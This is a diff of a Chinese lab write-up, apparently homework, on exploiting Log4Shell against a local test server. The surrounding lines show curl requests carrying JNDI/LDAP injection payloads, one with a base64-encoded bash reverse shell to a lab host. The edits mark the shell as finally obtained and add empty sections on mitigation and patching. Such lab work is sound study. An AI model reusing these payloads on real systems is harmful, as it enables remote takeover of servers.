@@ -31,7 +31,7 @@ curl http://192.168.8.129:33863/hello -d 'payload=${jndi:ldap://192.168.8.132:13
 ```bash
 curl "http://192.168.8.129:33863/hello?payload=\${jndi:ldap://192.168.8.132:1389/TomcatBypass/Command/Base64/$(echo -n 'bash -i >& /dev/tcp/192.168.8.132/443 0>&1' | base64 -w 0 | sed 's/+/%252B/g' | sed 's/=/%253d/g')}"
 ```
-__可能是网络问题，后续会再次进行测试。__
+~~__可能是网络问题，后续会再次进行测试。__~~
 
 改用强制使用GET请求，能够监听到LDAP请求，说明漏洞触发成功，但是无法反弹shell
 ![](./pic/强制GET收获监听初步进展.png)
@@ -79,4 +79,11 @@ curl -G "http://192.168.8.129:48217/hello" --data-urlencode "payload=\${jndi:lda
 ```
 ![](./pic/修改curl请求成功反弹shell.png)
 
-作业途中偶遇哈吉网站，拒绝POST请求疯狂哈气，拼尽全力，无法战胜
+# ~~作业途中偶遇哈吉网站，拒绝POST请求疯狂哈气，拼尽全力，无法战胜~~
+战胜了...暂时的
+
+# 漏洞缓解与绕过测试
+
+# 漏洞修复
+
+准备尝试使用更新到最新版本的办法
